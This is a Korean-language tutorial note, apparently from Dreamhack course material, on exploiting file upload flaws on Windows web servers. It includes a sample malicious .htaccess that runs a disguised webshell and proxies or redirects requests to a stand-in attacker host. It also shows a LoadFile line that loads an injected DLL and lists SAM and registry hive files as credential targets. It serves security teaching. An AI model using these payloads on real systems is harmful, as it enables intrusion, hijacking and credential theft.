파일 업로드 시 공격 지점 :
    일반적으로 웹 서비스는 Administrator 나 NT AUTHORITY\SYSTEM 계정 대신
    NT AUTHORITY\LocalService, NT AUTHORITY\NetworkService 와 같은 별도의 사용자로 구동되며,
    이상적으로는 ACL(접근 제어 목록) 등의 보안을 통해 웹 서비스 공격 시 그 영향을 최소화해야 합니다.

    만일 웹 서비스가 높은 권한으로 구동된다면 파일 업로드 취약점을 이용한 공격이 용이해집니다.
    높은 권한아 아니더라도 시스템 관리자가 웹 서비스와 같은 계정으로 로그인한다면 코드 실행 등의 공격이 가능합니다.

    오른쪽 탭에서 윈도 파일시스템에서 파일 업로드 취약점 공격 시 이용 가능한 지점에 대해 알아봅시다.

1) Apache Web Server
    Apache 웹 서버는 일반적으로 C:\ApacheXY\htdocs 나 C:\www 디렉터리에서 서버 설정을 입력받습니다. 
    그러나 AllowOverride 나 AllowOverrideList 디렉티브로 허용할 경우 웹 문서 디렉터리 내에서 특정 파일을 추가적으로 설정 파일로 입력받을 수 있습니다.
    해당 파일명은 기본값은 .htaccess이며, AccessFileName 디렉티브로 변경될 수 있습니다.

    .htaccess 파일이 허용되는 경우 파일 업로드 취약점을 이용해 아래에 같이 .htaccess 를 작성한 후
    웹 문서 디렉터리에 업로드하면 .php 확장자를 우회하여 웹쉘을 실행하거나 해당 디렉터리 내의 문서를 접근할 때
    공격자의 웹 페이지가 접속되는 등 영향을 미치게 됩니다.

    단 웹마스터가 AllowOverride 및 AllowOverrideList 디렉티브에서 허용한 디렉티브만 사용할 수 있습니다.
    ex)
        # .php 확장자 이외의 다른 파일명 또한 PHP 스크립트로 실행할 수 있도록 합니다.
        <Files "webshell-dreamhack.jpg">
            # php-fpm (PHP FastCGI Process Manager)을 사용하는 경우
            SetHandler "proxy:fcgi://localhost"
            
            # Apache2 자체 mod_php를 사용하는 경우
            SetHandler application/x-httpd-php
        </Files>
        
        # 모든 요청이 공격자의 웹서버로 전달되도록 합니다.
        RewriteEngine On
        RewriteOptions inherit
        # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
        RewriteRule (.*) fcgi://attacker.dreamhack.io.$1 [P]
        # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
        RewriteRule (.*) http://%{HTTP_HOST}at.attacker.dreamhack.io.$1 [P]
        # HTTP Redirect 사용
        RewriteRule (.*) http://%{HTTP_HOST}at.attacker.dreamhack.io.$1 [R=302,L]
        
        # 에러 페이지를 공격자의 웹 페이지로 리다이렉트합니다.
        ErrorDocument 404 https://attacker.dreamhack.io/

    한편 /etc/apache2 디렉터리 변경이 가능한 경우 아래와 같이 업로드한 공유 라이브러리를 로드해 임의 코드 실행이 가능합니다.
    ex)
        LoadFile "C:\www\path\to\my\injected\library.dll"

2) 시스템 파일
    다음은 관리자 권한에서 접근 가능한 시스템 파일의 일부입니다
    
        파일                                                설명

    C:\Windows\System32\config\systemprofile            NT AUTHORITY\SYSTEM 의 사용자 프로필 계정입니다. Linux의 /root 에 대응한다고 볼 수 있습니다.

    C:\Windows\System32\config\System                   HKEY_LOCAL_MACHINE\SYSTEM 레지스트리 키에 대응하는 하이브 파일입니다. 주요 시스템 설정 정보를 저장합니다.
    C:\Windows\System32\config\System.alt
    C:\Windows\System32\config\System.log
    C:\Windows\System32\config\System.sav


    C:\Windows\System32\config\Software                 HKEY_LOCAL_MACHINE\SOFTWARE 레지스트리 키에 대응하는 하이브 파일입니다. 
    C:\Windows\System32\config\Software.log             설치된 소프트웨어에서 사용됩니다.
    C:\Windows\System32\config\Software.sav


    C:\Windows\System32\config\SAM                      HKEY_LOCAL_MACHINE\SAM 레지스트리 키에 대응하는 하이브 파일입니다.  
    C:\Windows\System32\config\SAM.log                  사용자 비밀번호 및 인증 정보 등을 저장합니다.
    C:\Windows\System32\config\SAM.sav                  SAM은 Security Account Manager의 약자입니다.


    C:\Windows\System32\config\Security                 HKEY_LOCAL_MACHINE\Security 레지스트리 키에 대응하는 하이브 파일입니다.
    C:\Windows\System32\config\Security.alt             윈도의 보안 데이터베이스를 저장합니다.
    C:\Windows\System32\config\Security.log
    C:\Windows\System32\config\Security.sav
    

    C:\Windows\System32\config\Default                  HKEY_USERS\DEFAULT 레지스트리 키 대응하는 하이브 파일입니다.
    C:\Windows\System32\config\Default.log              사용자별 레지스트리 키의 기본 구조를 지정합니다.
    C:\Windows\System32\config\Default.sav

3) 사용자 설정 파일
    다음은 사용자 권한에서 접근 가능한 파일의 일부입니다.

        디렉터리                                                                설명

    %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup                 현재 사용자의 시작 프로그램 목록이 저장됩니다.

    %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp         모든 로컬 사용자의 시작 프로그램 목록이 저장됩니다.





























